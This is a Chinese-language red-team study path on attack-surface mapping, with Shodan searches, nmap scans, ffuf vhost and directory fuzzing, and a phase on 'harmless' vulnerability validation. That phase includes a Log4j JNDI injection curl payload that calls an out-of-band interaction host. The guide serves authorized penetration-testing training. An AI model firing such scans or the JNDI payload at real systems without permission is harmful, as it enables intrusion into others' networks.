# 🎯 外部暴露面探測、服務指紋與無害驗證深度學習路徑 (Attack Surface & Validation)
> 對應紅隊作戰矩陣：**Phase 1 (R05)** (R05.1 ~ R05.8)  
> 預計總投入時間：**30 ~ 35 小時**（視網路掃描、Web 模糊測試與指紋分析基礎而定）

---

## 📍 你在哪裡、去哪裡

```
你現在的狀態                         這份路徑帶你到達的位置
──────────────────                   ────────────────────────────
用 nmap 只會無腦 -A 狂掃 ──►         精通 SYN/Connect/UDP 探針狀態機與防火牆過濾判斷
依賴公開掃描器盲目掃描   ──►         精通全網測繪 API (Shodan/Censys) 零流量定位暴露面
看到 403 Forbidden 束手無策 ──►      精通 Virtual Host 碰撞與 Web 路徑遞迴 Fuzzing
驗證漏洞時容易打掛伺服器 ──►         精通無害條件觸發 (OOB Interactsh) 與安全證明
```

---

## 🧱 第零關：先確認你有這些基礎

| 概念 | 需要了解到的程度 | 快速補充資源 |
|------|-----------------|-------------|
| TCP 三向交握與旗標狀態 | 深入理解 SYN, ACK, RST, FIN 封包與核心防火牆響應 | [TCP/IP Illustrated Vol 1](https://en.wikipedia.org/wiki/TCP/IP_Illustrated) |
| HTTP/1.1 訊息語意 | 熟悉 Host 標頭、狀態碼 (200, 301, 401, 403, 500) 與內容類型 | [MDN: HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP) |
| CPE 與 CVE 弱點標準 | 理解通用平台列舉 (CPE) 格式與 CVSS 脆弱性評分標準 | [NVD: Common Platform Enumeration](https://nvd.nist.gov/products/cpe) |

---

## 🗺️ 整體學習地圖（五個階段）

```
階段一 ──────► 階段二 ──────► 階段三 ──────► 階段四 ──────► 階段五
全網測繪情資   主機存活與埠探測 服務協定指紋   VHost/目錄Fuzz  無害漏洞驗證
(5h)           (8h)           (6h)           (8h)           (5h)
```

---

## 🔍 階段一：網際網路掃描資料庫暴露情資（約 5 小時）

### 1.1 Shodan、Censys 與 FOFA 全網測繪
在不發送任何資料包抵達目標的前提下，調用第三方測繪引擎的快照：
```bash
# 透過 Shodan CLI 檢索目標網段中暴露的遠端桌面與工控服務
shodan search net:"203.0.113.0/24" port:3389,8080,502

# 檢索特定軟體標頭與自簽憑證指紋
shodan search 'org:"Target Corp" http.title:"Admin Console"'
```

---

## ⚡ 階段二：授權主機存活性與通訊埠開放狀態枚舉（約 8 小時）

### 2.1 主機存活性探針設計 (避免 ICMP 封鎖)
很多現代防火牆阻斷 ICMP Echo (Type 8)，但放行 TCP ACK 或特定 UDP 封包：
```bash
# 混合型存活性檢測：TCP SYN (443) + TCP ACK (80) + ICMP
nmap -sn -PS443 -PA80 -PE 203.0.113.1-50
```

### 2.2 SYN 隱蔽掃描 (Half-Open Scan) 狀態機解析
- 收到 `SYN/ACK` ➔ 通訊埠處於 `Open` 狀態（發送 `RST` 撕毀連線，避免完成交握留下應用層連線日誌）。
- 收到 `RST/ACK` ➔ 通訊埠處於 `Closed` 狀態。
- 逾時未回或收到 ICMP 不可達 ➔ 通訊埠處於 `Filtered` 狀態。
```bash
# 高速隱蔽 SYN 掃描常用 1000 埠
nmap -sS -Pn --top-ports 1000 -T4 -oA nmap_syn_top1000 203.0.113.10
```

---

## 🏷️ 階段三：服務與應用層通訊協定指紋識別（約 6 小時）

### 3.1 Nmap 版本偵測 (`-sV`) 探針匹配機制
Nmap 維護龐大的 `nmap-service-probes` 檔案，向目標埠發送特定應用層 payload 並比對返回的 Banner 正則表達式：
```bash
# 針對開放埠深入探測服務名稱、版本與 TLS 屬性
nmap -sV --version-intensity 7 -p 80,443,8080,8443 target.com
```

---

## 🚪 階段四：Web 虛擬主機 (VHost) 與目錄模糊測試（約 8 小時）

### 4.1 虛擬主機 (Virtual Host) 碰撞原理
同一台反向代理伺服器（Nginx/Apache）常根據 HTTP `Host` 標頭將流量路由至不同的內部虛擬主機。外部 DNS 未解析的子網域，仍可能透過 Host 標頭存取：
```bash
# 利用 ffuf 模糊測試 Host 標頭，並過濾預設頁面大小 (以 4242 為例)
ffuf -w subdomains.txt -u https://203.0.113.10/ -H "Host: FUZZ.target.com" -fs 4242
```

### 4.2 Web 目錄與檔案遞迴 Fuzzing
```bash
# 高速探測敏感後台與備份檔
ffuf -w raft-medium-directories.txt -u https://target.com/FUZZ -mc 200,301,302,403 -fc 404
```

---

## 🧪 階段五：遠端弱點存在條件無害驗證 (Safe PoC)（約 5 小時）

### 5.1 拒絕毀滅性攻擊，落實安全證明
- **Log4j / Spring4Shell 盲注驗證**：嚴禁執行命令反彈 Shell，應透過 DNS 外帶 (OOB) 信標證明：
  ```bash
  # 利用 Interactsh 外帶觸發驗證
  curl -H "X-Api-Version: \${jndi:ldap://test.oob.interact.sh/a}" https://target.com/api
  ```
- **記憶體讀取與任意檔案包含**：僅讀取靜態無害系統標籤（如 `/etc/issue` 或 `/etc/hostname`），杜絕讀取敏感帳密檔案引發個資法規爭議。

---

## ✅ 本路徑通過檢查表（Checklist）

- [ ] 能熟練使用 Shodan API 篩選特定組織的暴露資產。
- [ ] 深入理解 Nmap SYN 掃描三種響應狀態（Open/Closed/Filtered）的封包旗標意義。
- [ ] 能使用 ffuf 進行 Host 標頭模糊測試並準確排除預設大小響應。
- [ ] 掌握目錄遍歷字典的使用時機與 HTTP 狀態碼過濾策略。
- [ ] 能獨立使用 OOB (帶外) 技術完成無害化遠端漏洞存在性證明。
